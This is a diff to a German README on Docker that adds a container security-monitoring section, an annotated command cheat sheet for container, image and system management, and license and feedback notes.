+  --cpus=0.5 \
+  app:latest
+```
+
+### 5. Security Monitoring
+
+```bash
+# Unerwartete Prozesse
+docker exec container ps aux | grep -v "expected_process"
+
+# Privilege Escalation Versuche
+docker logs container | grep -E "(sudo|su -|chmod \+s)"
+
+# Datei-Zugriffsmuster
+docker exec container find /etc /usr/bin -newer /tmp/baseline -ls
+
+# Runtime-Änderungen erkennen
+docker diff container_id
+
+# Netzwerk-Verbindungen auflisten
+docker exec container ss -tuln
+
+# Offene Dateien überwachen
+docker exec container lsof
+```
+
+> [!CAUTION]
+> **Goldene Regel:** Docker nicht als Sicherheitsgrenze! Container-Isolation ist kein Ersatz für Security Controls auf Host-Ebene.
+
 ## Docker Cheat Sheet
 
 ```bash
-# Anzeigen von allen laufenden Containern
-$~ docker ps
-CONTAINER ID   IMAGE      COMMAND      CREATED      STATUS      PORTS                     NAMES
-845adedf395c   foo_bar    ".."         1 sec ago    RUNNING     0.0.0.0:5432->3000/tcp    ...
+# Container-Management
+docker ps                              # Laufende Container anzeigen
+docker ps -a                           # Alle Container anzeigen (inkl. gestoppte)
+docker run [IMAGE_TAG]                 # Container aus Image erstellen und starten
+docker start/stop [CONTAINER_ID/NAME]  # Container starten/stoppen
+docker restart [CONTAINER_ID/NAME]     # Container neustarten
+docker rm [CONTAINER_ID/NAME]          # Container entfernen
+docker rm $(docker ps -aq)             # Alle Container entfernen
 
-# Anzeigen von allen Containern (auch beendete)
-$~ docker ps -a
+# Container-Interaktion
+docker exec -it [CONTAINER_ID/NAME] /bin/bash  # Terminal in Container öffnen
+docker attach [CONTAINER_ID/NAME]              # An Container-Prozess anhängen
+docker logs [CONTAINER_ID/NAME]                # Container-Logs anzeigen
+docker cp [SRC] [CONTAINER]:[DEST]             # Dateien kopieren
 
-# Erstellen eines Containern basierend auf einem Image
-$~ docker run [IMAGE_TAG]
+# Image-Management
+docker images                          # Alle lokalen Images anzeigen
+docker build -t [TAG] .               # Image aus Dockerfile bauen
+docker pull [IMAGE]                   # Image von Registry herunterladen
+docker push [IMAGE]                   # Image zu Registry hochladen
+docker rmi [IMAGE_ID]                 # Image entfernen
 
-# Starten und Stoppen von Containern
-$~ docker start / stop [CONTAINER_ID / NAME]
-
-# Entfernen von Containern
-$~ docker rm [CONTAINER_ID / NAME]
-
-# Streamen des STDIN / STDOUT eines Containers
-$~ docker attach [CONTAINER_ID / NAME]
-
-# Ausführen von Befehlen in einem Container, z.B. starten eines Terminals
-$~ docker exec –it [CONTAINER_ID / NAME] /bin/bash
+# System-Verwaltung
+docker system prune                   # Ungenutzte Ressourcen bereinigen
+docker volume ls                      # Volumes anzeigen
+docker network ls                     # Networks anzeigen
 ```
 
 ## Dieses Repo
 
 ![QR Code](assets/qr.png)
+
+### Lizenz
+
+Dieses Projekt steht unter der [MIT-Lizenz](LICENSE)
+
+### Feedback und Beiträge
+
+Pull Requests, Issues und jede andere Art von Feedback sind immer willkommen!
